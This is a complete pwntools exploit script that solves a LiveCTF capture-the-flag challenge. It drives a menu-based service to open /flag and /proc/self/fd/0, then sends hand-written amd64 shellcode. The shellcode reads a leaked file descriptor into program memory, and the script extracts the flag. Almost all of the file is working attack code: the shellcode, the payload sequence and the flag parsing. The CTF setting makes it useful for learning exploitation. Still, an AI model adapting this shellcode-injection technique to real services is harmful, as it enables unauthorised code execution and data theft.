

#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

p = remote(HOST, int(PORT))
# p.interactive()

context.arch = 'amd64'

# p = process('./challenge')

sc = '''
mov r13, rsp
xor rax, rax
mov rdi, 5
mov rsi, r13
sub rsi, 0x1700
mov rdx, 100
syscall


mov rdi, [rbp-0x28]
add rdi, 0xc
mov rdx, [rsi]
mov [rdi], rdx
mov rdx, [rsi + 8]
mov [rdi + 8], rdx
mov rdx, [rsi + 0x10]
mov [rdi + 0x10], rdx
mov rdx, [rsi + 0x18]
mov [rdi + 0x18], rdx
mov rdx, [rsi + 0x20]
mov [rdi + 0x20], rdx
mov rdx, [rsi + 0x28]
mov [rdi + 0x28], rdx
mov rdx, [rsi + 0x30]
mov [rdi + 0x30], rdx
mov rdx, [rsi + 0x38]
mov [rdi + 0x38], rdx
mov rdx, [rsi + 0x40]
mov [rdi + 0x40], rdx
mov rdx, [rsi + 0x48]
mov [rdi + 0x48], rdx
mov rdx, [rsi + 0x50]
mov [rdi + 0x50], rdx
mov rdx, [rsi + 0x58]
mov [rdi + 0x58], rdx
ret
'''
sc = asm(sc)
# print(disasm(sc))
p.sendlineafter("Choice: ", "1")
p.sendlineafter(">", b"/flag")
p.sendlineafter("Choice: ", "1")
p.sendlineafter(">", b"/flag")
p.sendlineafter("Choice: ", "1")
p.sendlineafter(">", b"/proc/self/fd/0\x00")
sleep(1)
p.sendline(sc)
p.sendlineafter("Choice: ", "2")
p.recvuntil("LiveCTF{").decode()
flag = p.recvuntil("}").decode()
flag = "LiveCTF{" + flag
# # flag = flag[:flag.index("}")+1]
log.info('Flag: %s', flag)


# p.interactive()

